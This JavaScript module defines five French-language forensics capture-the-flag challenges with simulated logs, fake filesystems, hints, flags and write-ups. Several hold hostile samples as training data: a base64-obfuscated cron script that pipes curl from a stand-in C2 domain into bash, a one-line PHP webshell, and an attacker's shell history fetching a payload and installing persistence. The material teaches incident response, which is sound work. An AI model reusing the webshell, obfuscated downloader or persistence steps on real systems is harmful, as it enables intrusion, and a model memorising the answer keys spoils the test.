import { cache, b64, code } from './_aides.mjs';

// Générateur pseudo-aléatoire déterministe : les journaux sont identiques à chaque génération.
function alea(graine) { let a = graine >>> 0; return () => { a = (a + 0x6D2B79F5) >>> 0; let t = Math.imul(a ^ (a >>> 15), a | 1); t ^= t + Math.imul(t ^ (t >>> 7), t | 61); return ((t ^ (t >>> 14)) >>> 0) / 4294967296; }; }
const pad = n => String(n).padStart(2, '0');

/* ---------- journal d'accès Apache (force brute WordPress) ---------- */
function journalApache() {
  const r = alea(42), lignes = [];
  const UA = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15'];
  const PAGES = [['/', 200, 18234], ['/boutique/', 200, 24311], ['/blog/recette-cassoulet/', 200, 15872], ['/contact/', 200, 9120], ['/wp-content/themes/brique/style.css', 200, 30211], ['/wp-content/uploads/2025/03/vitrine.jpg', 200, 182330], ['/favicon.ico', 200, 4286], ['/blog/', 200, 13002], ['/a-propos/', 200, 8211]];
  const visiteurs = ['198.51.100.14', '198.51.100.62', '192.0.2.31', '198.51.100.140', '192.0.2.88', '198.51.100.7'];
  const ev = [];
  let t = Date.UTC(2025, 2, 12, 8, 2, 11);
  for (let i = 0; i < 70; i++) { t += Math.floor(r() * 40000) + 3000; const ip = visiteurs[Math.floor(r() * visiteurs.length)], p = PAGES[Math.floor(r() * PAGES.length)]; ev.push([t, ip, 'GET', p[0], p[1], p[2], UA[Math.floor(r() * UA.length)], 'https://www.google.com/']); }
  // un scanner bruyant mais sans succès
  let s = Date.UTC(2025, 2, 12, 8, 21, 4);
  for (const p of ['/.env', '/phpmyadmin/', '/admin.php', '/.git/config', '/backup.zip', '/wp-config.php.bak', '/server-status']) { s += 1100; ev.push([s, '192.0.2.200', 'GET', p, 404, 196, 'Mozilla/5.0 zgrab/0.x', '-']); }
  // la force brute
  let b = Date.UTC(2025, 2, 12, 8, 31, 40);
  for (let i = 0; i < 46; i++) { b += Math.floor(r() * 1800) + 900; ev.push([b, '203.0.113.77', 'POST', '/wp-login.php', 200, 4123 + Math.floor(r() * 40), 'python-requests/2.31.0', '-']); }
  b += 1300; ev.push([b, '203.0.113.77', 'POST', '/wp-login.php', 302, 0, 'python-requests/2.31.0', '-']);
  b += 700; ev.push([b, '203.0.113.77', 'GET', '/wp-admin/', 200, 48211, 'python-requests/2.31.0', '-']);
  b += 5200; ev.push([b, '203.0.113.77', 'GET', '/wp-admin/plugin-install.php', 200, 61234, 'python-requests/2.31.0', '-']);
  b += 9100; ev.push([b, '203.0.113.77', 'POST', '/wp-admin/update.php?action=upload-plugin', 200, 3321, 'python-requests/2.31.0', '-']);
  b += 4000; ev.push([b, '203.0.113.77', 'GET', '/wp-content/plugins/maj-cache/x.php?c=id', 200, 54, 'python-requests/2.31.0', '-']);
  const mois = ['Jan', 'Feb', 'Mar', 'Apr'];
  return ev.sort((x, y) => x[0] - y[0]).map(([t2, ip, m, p, st, taille, ua, ref]) => { const d = new Date(t2 + 3600000); return `${ip} - - [${pad(d.getUTCDate())}/${mois[d.getUTCMonth()]}/${d.getUTCFullYear()}:${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} +0100] "${m} ${p} HTTP/1.1" ${st} ${taille} "${ref}" "${ua}"`; }).join('\n');
}

/* ---------- auth.log (SSH) ---------- */
function journalAuth() {
  const r = alea(7), ev = [];
  const h = (hh, mm, ss) => ({ hh, mm, ss });
  const ligne = (t, txt) => ev.push([t.hh * 3600 + t.mm * 60 + t.ss, `Mar 14 ${pad(t.hh)}:${pad(t.mm)}:${pad(t.ss)} srv-web sshd[${2000 + ev.length * 3}]: ${txt}`]);
  ligne(h(1, 2, 44), 'Accepted publickey for alex from 192.0.2.10 port 50122 ssh2: ED25519 SHA256:9mQx…');
  ligne(h(1, 2, 44), 'pam_unix(sshd:session): session opened for user alex(uid=1000) by (uid=0)');
  ligne(h(1, 31, 9), 'pam_unix(sshd:session): session closed for user alex');
  let s = 3 * 3600 + 9 * 60 + 12;
  const noms = ['admin', 'root', 'test', 'oracle', 'ubuntu', 'admin', 'pi', 'user', 'deploy', 'git', 'root', 'deploy', 'admin', 'ftp', 'deploy', 'postgres', 'deploy', 'root', 'deploy', 'www', 'deploy'];
  for (const n of noms) { s += Math.floor(r() * 9) + 6; const t = h(Math.floor(s / 3600), Math.floor(s / 60) % 60, s % 60); ligne(t, n === 'deploy' || n === 'root' ? `Failed password for ${n} from 198.51.100.23 port ${40000 + Math.floor(r() * 20000)} ssh2` : `Failed password for invalid user ${n} from 198.51.100.23 port ${40000 + Math.floor(r() * 20000)} ssh2`); }
  ligne(h(3, 14, 7), 'Accepted password for deploy from 198.51.100.23 port 51990 ssh2');
  ligne(h(3, 14, 7), 'pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)');
  ligne(h(3, 16, 30), 'Failed password for invalid user admin from 192.0.2.150 port 61002 ssh2');
  ligne(h(3, 22, 51), 'pam_unix(sshd:session): session closed for user deploy');
  ligne(h(8, 1, 3), 'Accepted publickey for alex from 192.0.2.10 port 50544 ssh2: ED25519 SHA256:9mQx…');
  ligne(h(8, 1, 3), 'pam_unix(sshd:session): session opened for user alex(uid=1000) by (uid=0)');
  const sudo = [[3, 15, 2, 'sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt install -y netcat'], [3, 17, 40, 'useradd[3121]: new user: name=support2, UID=1002, GID=1002, home=/home/support2, shell=/bin/bash']];
  sudo.forEach(([a, b2, c, txt]) => ev.push([a * 3600 + b2 * 60 + c, `Mar 14 ${pad(a)}:${pad(b2)}:${pad(c)} srv-web ${txt}`]));
  return ev.sort((x, y) => x[0] - y[0]).map(x => x[1]).join('\n');
}

const LISEZMOI = `RAPPORT D'INCIDENT — srv-web-03 (simulation)
Depuis trois nuits, le serveur web consomme 100 % de CPU vers 3 h du matin.
Mission : trouver le mécanisme de persistance installé par l'attaquant
et le DOMAINE qu'il contacte. Flag : LUMIO{domaine}

Pistes : les tâches planifiées vivent dans /etc/cron.d/ ; l'historique des
commandes d'un compte est dans ~/.bash_history ; les attaquants aiment /tmp.
Commandes utiles : ls -la, cat, find / -name "*.sh", grep -r motif dossier, base64 -d
`;
const SCRIPT_C2 = `#!/bin/bash
# kworker : mise à jour système (ne pas supprimer)
echo '${b64('curl -s http://c2.ombre-noire.example/k.sh | bash')}' | base64 -d | bash
`;

export default [
  {
    id: 'foren-ip', categorie: 'forensique', titre: 'Qui a forcé la porte ?', difficulte: 1, points: 100,
    accroche: 'Un journal d\'accès Apache, des dizaines de tentatives de connexion… et une qui passe.',
    briefing: `<p class="dossier">Dossier FO-01 · Boutique en ligne d'une épicerie fine (simulation)</p>
<p>La gérante d'une petite boutique WordPress a reçu une alerte : une extension inconnue est apparue dans son tableau de bord. L'hébergeur t'envoie le journal d'accès du serveur pour la matinée du 12 mars.</p>
<p><b>Question :</b> quelle adresse IP a mené une attaque par force brute sur la page de connexion <i>et</i> a réussi à entrer ? Flag : <code>LUMIO{adresse_ip}</code>.</p>
<p class="muted">Les adresses utilisées (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) sont réservées à la documentation : elles n'appartiennent à personne.</p>`,
    ressources: [{ type: 'log', titre: 'access.log', nom: 'access.log', contenu: cache(journalApache()), description: 'Format « combined » : IP, date, requête, code HTTP, taille, référent, navigateur (User-Agent).' }],
    outils: [],
    indices: [
      { cout: 20, texte: 'La page de connexion de WordPress est /wp-login.php. Filtre les lignes avec « wp-login ».' },
      { cout: 30, texte: 'Une connexion ratée renvoie la page avec le code 200 ; une connexion réussie redirige (code 302) vers /wp-admin/. Cherche « 302 ».' }
    ],
    validation: 'flag', format: 'Format : LUMIO{a.b.c.d}',
    flags: ['LUMIO{203.0.113.77}'],
    writeup: `<h3>1. Lire une ligne de journal</h3>${code('text', '203.0.113.77 - - [12/Mar/2025:09:31:41 +0100] "POST /wp-login.php HTTP/1.1" 200 4139 "-" "python-requests/2.31.0"')}
<p>IP du client, date, <b>méthode et chemin</b>, <b>code de réponse</b>, taille, référent, <b>User-Agent</b>.</p>
<h3>2. Filtrer</h3><p>En filtrant sur <code>wp-login</code>, une seule IP envoie des dizaines de <code>POST</code> en quelques secondes d'intervalle, avec un User-Agent de script (<code>python-requests</code>) : c'est une <b>force brute</b> de mots de passe.</p>
<p>Attention au piège : <code>192.0.2.200</code> est aussi suspecte (elle cherche <code>/.env</code>, <code>/.git/config</code>…), mais elle ne reçoit que des <code>404</code> : c'est un scanner automatique qui a échoué.</p>
<h3>3. Le moment de la réussite</h3><p>Après 46 réponses <code>200</code> (échecs : WordPress réaffiche le formulaire), la 47<sup>e</sup> tentative reçoit un <code>302</code> (redirection), suivi d'un <code>GET /wp-admin/</code> réussi, de l'installation d'une extension et d'un appel à <code>x.php?c=id</code> : un <b>webshell</b>.</p>
${code('bash', "grep wp-login access.log | cut -d ' ' -f 1 | sort | uniq -c | sort -n\ngrep ' 302 ' access.log")}
<p>Flag : <code>LUMIO{203.0.113.77}</code></p>`,
    retenir: 'Pour un incident web : filtrer par chemin sensible, compter par IP, puis chercher le changement de code HTTP qui marque la réussite. Remède : MFA, limitation des tentatives, mots de passe forts.'
  },
  {
    id: 'foren-chrono', categorie: 'forensique', titre: 'Chronologie d\'une nuit agitée', difficulte: 2, points: 200,
    accroche: 'Un auth.log SSH : établis à la seconde près quand l\'intrus est entré.',
    briefing: `<p class="dossier">Dossier FO-02 · Serveur de développement d'une agence web (simulation)</p>
<p>Le matin du 14 mars, l'équipe découvre un compte utilisateur inconnu sur le serveur. Avant de tout réinstaller, la responsable veut une <b>chronologie</b> précise. Voici le journal d'authentification <code>/var/log/auth.log</code>.</p>
<p><b>Question :</b> sur quel compte l'attaquant s'est-il connecté avec succès, et à quelle heure exacte ? Flag : <code>LUMIO{compte_HH:MM:SS}</code>.</p>`,
    ressources: [{ type: 'log', titre: 'auth.log', nom: 'auth.log', contenu: cache(journalAuth()), description: 'Journal des authentifications (SSH, sudo, création de comptes).' }],
    outils: [],
    indices: [
      { cout: 20, texte: 'Les échecs s\'écrivent « Failed password », les réussites « Accepted password » ou « Accepted publickey ».' },
      { cout: 40, texte: 'Alex se connecte tous les jours par clé (publickey) depuis 192.0.2.10 : c\'est normal. Cherche une connexion par mot de passe depuis l\'IP qui accumule les échecs.' }
    ],
    validation: 'flag', format: 'Format : LUMIO{compte_HH:MM:SS}',
    flags: ['LUMIO{deploy_03:14:07}', 'LUMIO{deploy_031407}', 'LUMIO{deploy_3:14:07}', 'LUMIO{deploy_03h14m07s}'],
    writeup: `<h3>1. Séparer le normal de l'anormal</h3><p>Alex se connecte <b>par clé</b> depuis <code>192.0.2.10</code> à 01:02 et 08:01 : c'est son habitude. En revanche, <code>198.51.100.23</code> enchaîne à partir de 03:09 des <code>Failed password</code> sur des comptes courants (admin, root, pi, oracle…) : une <b>attaque par dictionnaire</b>.</p>
<h3>2. Trouver la réussite</h3>${code('bash', 'grep "Accepted" auth.log\ngrep 198.51.100.23 auth.log | tail -n 3')}
<p><code>Mar 14 03:14:07 … Accepted password for deploy from 198.51.100.23</code> : le compte <b>deploy</b>, protégé par un simple mot de passe, est tombé à <b>03:14:07</b>.</p>
<h3>3. Reconstituer la suite</h3><ul><li>03:15:02 — <code>sudo apt install netcat</code> : le compte deploy a les droits sudo (problème de moindre privilège).</li><li>03:17:40 — <code>useradd … name=support2</code> : création d'un compte de <b>persistance</b>.</li><li>03:22:51 — fin de session.</li></ul>
<p>Flag : <code>LUMIO{deploy_03:14:07}</code></p>`,
    retenir: 'Une chronologie d\'incident se construit en séparant l\'activité habituelle (comptes, IP, méthodes) de l\'anomalie, puis en suivant l\'attaquant après le premier succès. SSH : clés uniquement, pas de mot de passe, fail2ban.'
  },
  {
    id: 'foren-signature', categorie: 'forensique', titre: 'Le rapport qui ne s\'ouvre pas', difficulte: 2, points: 200,
    accroche: 'Un « PDF » que aucun lecteur PDF n\'accepte. Et si l\'extension mentait ?',
    briefing: `<p class="dossier">Dossier FO-03 · Clé USB trouvée dans une salle de réunion (simulation)</p>
<p>Sur une clé USB oubliée, un seul fichier : <code>rapport_final.pdf</code>. Les lecteurs PDF affichent « fichier endommagé ». Le service informatique te le confie avant de le jeter.</p>
<p>Le type d'un fichier ne dépend pas de son extension mais de ses <b>premiers octets</b> (sa « signature », ou nombre magique). Que contient vraiment ce fichier ?</p>`,
    ressources: [{ type: 'fichier', titre: 'Fichier trouvé', nom: 'rapport_final.pdf', src: 'assets/ctf/fichiers/rapport_final.pdf', taille: 'environ 20 Ko', outils: ['hex'], description: 'Ouvre-le dans l\'outil « Hex & signatures ».' }],
    outils: ['hex'],
    indices: [
      { cout: 20, texte: 'Un vrai PDF commence par les octets 25 50 44 46 (« %PDF »). Regarde les premiers octets de ce fichier dans la vue hexadécimale.' },
      { cout: 30, texte: '89 50 4E 47 0D 0A 1A 0A : c\'est la signature d\'une image PNG. Clique sur « Essayer d\'afficher comme image ».' }
    ],
    validation: 'flag', format: 'Format : LUMIO{…} (le texte écrit dans le fichier)',
    flags: ['LUMIO{les_extensions_mentent}'],
    writeup: `<h3>1. Lire les premiers octets</h3>${code('text', '00000000  89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52  .PNG........IHDR')}
<p>Un PDF commencerait par <code>25 50 44 46 2D</code> (<code>%PDF-</code>). Ici on lit <code>89 50 4E 47</code> suivi de <code>IHDR</code> : c'est une <b>image PNG</b> renommée en .pdf.</p>
<h3>2. Ouvrir avec le bon programme</h3><p>Dans l'outil Hex : « Essayer d'afficher comme image ». Sous Linux : <code>file rapport_final.pdf</code> répond <code>PNG image data</code> ; on renomme en <code>.png</code>. L'image contient une note manuscrite avec le flag.</p>
<h3>3. Pourquoi c'est important</h3><p>Les logiciels malveillants jouent souvent sur ce décalage (« facture.pdf.exe », documents piégés). Les outils d'analyse se fient aux signatures, pas aux extensions : <code>file</code>, <code>binwalk</code>, <code>exiftool</code>, la bibliothèque libmagic.</p>
<p>Flag : <code>LUMIO{les_extensions_mentent}</code></p>`,
    retenir: 'Le vrai type d\'un fichier se lit dans ses premiers octets (nombre magique), pas dans son extension.'
  },
  {
    id: 'foren-terminal', categorie: 'forensique', titre: 'Le dossier invisible', difficulte: 2, points: 200,
    accroche: 'Un terminal Linux, un utilisateur qui croit que les points cachent tout.',
    briefing: `<p class="dossier">Dossier FO-04 · Poste de travail d'Alex (simulation)</p>
<p>Alex affirme avoir rangé « en lieu sûr » une clé d'accès de test sur son poste Linux. Tu as un accès en lecture à son dossier personnel dans le terminal ci-dessous. Retrouve la clé et décode-la.</p>
<p>Commence par <code>help</code>, puis <code>ls</code>. Sous Linux, les fichiers et dossiers dont le nom commence par un point sont <b>masqués</b> par défaut.</p>`,
    ressources: [{ type: 'terminal', titre: 'Terminal — pc-alex', utilisateur: 'alex', hote: 'pc-alex', motd: 'Bienvenue sur pc-alex (simulation). Tape « help » pour la liste des commandes.',
      fs: cache({
        '/home/alex/notes.txt': 'À faire :\n- ranger la clé de test quelque part de discret\n- personne ne regarde les dossiers cachés de toute façon\n- penser à rappeler le garage\n',
        '/home/alex/Documents/budget.csv': 'poste;montant\nloyer;720\ncourses;310\nabonnement salle;29\n',
        '/home/alex/Documents/recette.txt': 'Cassoulet : haricots tarbais, confit de canard, saucisse de Toulouse. Cuisson lente.\n',
        '/home/alex/Images/': null,
        '/home/alex/Téléchargements/facture-mars.txt': 'Facture n°2025-03-118 — 49,90 € TTC\n',
        '/home/alex/.bashrc': 'alias ll="ls -la"\nexport EDITOR=nano\n',
        '/home/alex/.config/code/settings.json': '{ "editor.fontSize": 14 }\n',
        '/home/alex/.config/.coffre/LISEZMOI': 'La clé est dans cle.txt, encodée pour que personne ne la lise par-dessus mon épaule.\n',
        '/home/alex/.config/.coffre/cle.txt': b64('LUMIO{les_fichiers_caches_commencent_par_un_point}') + '\n',
        '/etc/hostname': 'pc-alex\n'
      }) }],
    outils: ['boite'],
    indices: [
      { cout: 20, texte: 'ls -a affiche aussi les éléments cachés (ceux qui commencent par un point). Essaie-le dans chaque dossier.' },
      { cout: 30, texte: 'find ~ -name "*.txt" liste tous les fichiers .txt, cachés compris.' },
      { cout: 30, texte: 'Le contenu de cle.txt est en Base64 : cat ~/.config/.coffre/cle.txt | base64 -d' }
    ],
    validation: 'flag', format: 'Format : LUMIO{…}',
    flags: ['LUMIO{les_fichiers_caches_commencent_par_un_point}'],
    writeup: `<h3>1. Explorer, y compris le caché</h3>${code('bash', `ls          # notes.txt  Documents/  Images/  Téléchargements/
ls -a       # .  ..  .bashrc  .config/  …
ls -a .config   # .coffre/  code/`)}
<p><code>notes.txt</code> donne l'idée : « personne ne regarde les dossiers cachés ». Un nom commençant par un point est simplement <b>non affiché</b> par <code>ls</code> : ce n'est pas une protection.</p>
<h3>2. Chercher plus vite</h3>${code('bash', 'find ~ -name "*.txt"\n# /home/alex/.config/.coffre/cle.txt')}
<h3>3. Décoder</h3>${code('bash', 'cat ~/.config/.coffre/cle.txt | base64 -d')}
<p>Flag : <code>LUMIO{les_fichiers_caches_commencent_par_un_point}</code></p>`,
    retenir: 'Un fichier caché n\'est pas protégé : seuls les droits (chmod), le chiffrement ou un gestionnaire de secrets protègent une clé.'
  },
  {
    id: 'foren-persistance', categorie: 'forensique', titre: 'Persistance à 3 h du matin', difficulte: 3, points: 300,
    accroche: 'Cron, /tmp, Base64 : remonte jusqu\'au serveur de commande de l\'attaquant.',
    briefing: `<p class="dossier">Dossier FO-05 · Réponse à incident sur srv-web-03 (simulation)</p>
<p>Le serveur web d'une PME s'emballe chaque nuit. Une intrusion a eu lieu il y a quelques jours. Ta mission : trouver comment l'attaquant revient automatiquement (<b>persistance</b>) et le <b>nom de domaine</b> de son serveur de commande. Lis d'abord <code>LISEZMOI.txt</code>.</p>
<p>Flag : <code>LUMIO{nom.de.domaine}</code></p>`,
    ressources: [{ type: 'terminal', titre: 'Terminal — srv-web-03', utilisateur: 'analyste', hote: 'srv-web-03', motd: 'Session d\'analyse en lecture seule sur srv-web-03 (simulation). Commence par : cat LISEZMOI.txt',
      fs: cache({
        '/home/analyste/LISEZMOI.txt': LISEZMOI,
        '/etc/hostname': 'srv-web-03\n',
        '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nanalyste:x:1000:1000::/home/analyste:/bin/bash\nsupport2:x:1002:1002::/home/support2:/bin/bash\n',
        '/etc/cron.d/logrotate': '25 6 * * * root test -x /usr/sbin/logrotate && /usr/sbin/logrotate /etc/logrotate.conf\n',
        '/etc/cron.d/maj-systeme': '# mise à jour système\n0 3 * * * root /bin/bash /tmp/.cache/kworker.sh >/dev/null 2>&1\n',
        '/etc/cron.d/certbot': '0 */12 * * * root certbot -q renew\n',
        '/tmp/.cache/kworker.sh': SCRIPT_C2,
        '/tmp/sess_8f2a1c': 'user|s:5:"guest";\n',
        '/var/www/html/index.html': '<h1>Bienvenue chez Menuiserie Dubreuil</h1>\n',
        '/var/www/html/uploads/facture.php': '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>\n',
        '/var/www/.bash_history': 'id\nuname -a\ncd /tmp\nmkdir .cache\ncd .cache\nwget -q -O kworker.sh http://198.51.100.23/kw.txt\nchmod +x kworker.sh\necho "0 3 * * * root /bin/bash /tmp/.cache/kworker.sh >/dev/null 2>&1" > /etc/cron.d/maj-systeme\nhistory -c\n',
        '/var/log/syslog': 'Mar 17 03:00:01 srv-web-03 CRON[4410]: (root) CMD (/bin/bash /tmp/.cache/kworker.sh >/dev/null 2>&1)\nMar 18 03:00:01 srv-web-03 CRON[4630]: (root) CMD (/bin/bash /tmp/.cache/kworker.sh >/dev/null 2>&1)\nMar 18 06:25:01 srv-web-03 CRON[4702]: (root) CMD (test -x /usr/sbin/logrotate && /usr/sbin/logrotate /etc/logrotate.conf)\n',
        '/home/support2/': null
      }) }],
    outils: ['boite'],
    indices: [
      { cout: 30, texte: 'ls /etc/cron.d puis cat de chaque fichier : l\'un d\'eux n\'est pas d\'origine et lance un script à 3 h.' },
      { cout: 40, texte: 'Le script lancé est /tmp/.cache/kworker.sh. Il contient une ligne en Base64 : décode-la (echo … | base64 -d).' },
      { cout: 50, texte: 'La ligne décodée est une commande curl : le domaine est entre « http:// » et le « / » suivant.' }
    ],
    validation: 'flag', format: 'Format : LUMIO{nom.de.domaine}',
    flags: ['LUMIO{c2.ombre-noire.example}'],
    writeup: `<h3>1. Les tâches planifiées</h3>${code('bash', 'ls /etc/cron.d\ncat /etc/cron.d/maj-systeme\n# 0 3 * * * root /bin/bash /tmp/.cache/kworker.sh')}
<p>Un fichier <code>maj-systeme</code> lance chaque nuit à 3 h, en root, un script caché dans <code>/tmp/.cache/</code>. Les vraies mises à jour ne vivent jamais dans <code>/tmp</code> : c'est la <b>persistance</b>. <code>/var/log/syslog</code> confirme les exécutions à 03:00:01.</p>
<h3>2. Le script</h3>${code('bash', 'cat /tmp/.cache/kworker.sh\n# echo \'Y3VybCAtcyBodHRw…\' | base64 -d | bash')}
<p>Le script ne contient pas de commande lisible : il décode une chaîne Base64 et l'exécute. Technique classique pour échapper à une recherche de mots-clés comme « curl » ou « http ».</p>
${code('bash', "grep base64 /tmp/.cache/kworker.sh | cut -d \"'\" -f 2 | base64 -d\n# curl -s http://c2.ombre-noire.example/k.sh | bash")}
<p>Chaque nuit, le serveur télécharge et exécute un nouveau script depuis <code>c2.ombre-noire.example</code> : le <b>serveur de commande et de contrôle</b> (C2).</p>
<h3>3. Le reste de l'histoire</h3><ul><li><code>/var/www/html/uploads/facture.php</code> : un <b>webshell</b> qui exécute le paramètre <code>c</code>, point d'entrée initial.</li><li><code>/var/www/.bash_history</code> : les commandes de l'attaquant sous l'identité www-data, jusqu'à <code>history -c</code> (effacement… raté, le fichier est resté).</li><li><code>/etc/passwd</code> : un compte <code>support2</code> créé en renfort.</li></ul>
<p>Flag : <code>LUMIO{c2.ombre-noire.example}</code></p>`,
    retenir: 'Persistance Linux : cron, services systemd, comptes ajoutés, clés SSH autorisées. On cherche ce qui n\'est pas d\'origine, on décode les commandes obfusquées et on bloque les indicateurs (domaines, IP) au pare-feu.'
  }
];
